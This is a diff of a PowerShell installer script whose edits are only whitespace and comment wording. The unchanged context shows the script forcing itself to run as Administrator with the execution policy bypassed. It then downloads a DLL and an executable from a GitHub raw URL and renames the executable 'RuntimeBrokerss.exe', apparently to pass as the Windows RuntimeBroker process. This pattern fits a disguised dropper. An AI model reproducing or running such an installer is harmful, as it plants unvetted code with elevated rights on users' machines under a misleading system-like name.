@@ -10,7 +10,7 @@ $choice = Read-Host "Enter choice (1/2)"
 # -----------------------------
 # Check for Administrator rights
 # -----------------------------
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
     Write-Host "Restarting with Administrator privileges..."
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
@@ -31,7 +31,7 @@ $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/ref
 if ($choice -eq "1") {
     Write-Host "`nStarting installation..."
 
-    # Download DLL if not exists
+    # DLL download if not exists
     if (-not (Test-Path $dllDestination)) {
         Write-Host "Downloading Guna.UI2.dll..."
         try {
@@ -45,7 +45,7 @@ if ($choice -eq "1") {
         Write-Host "Guna.UI2.dll already exists. Skipping download." -ForegroundColor Yellow
     }
 
-    # Download exe if not exists
+    # EXE download if not exists
     if (-not (Test-Path $exeDestination)) {
         Write-Host "Downloading and renaming executable to RuntimeBrokerss.exe..."
         try {
@@ -89,12 +89,13 @@ elseif ($choice -eq "2") {
     }
 
     # Remove files if they exist
-    if (Test-Path $exeDestination) {
-        Remove-Item $exeDestination -Force
+    if (Test-Path $exeDestination) { 
+        Remove-Item $exeDestination -Force 
         Write-Host "Removed executable: $exeDestination" -ForegroundColor Green
     }
-    if (Test-Path $dllDestination) {
-        Remove-Item $dllDestination -Force
+    
+    if (Test-Path $dllDestination) { 
+        Remove-Item $dllDestination -Force 
         Write-Host "Removed DLL: $dllDestination" -ForegroundColor Green
     }
 
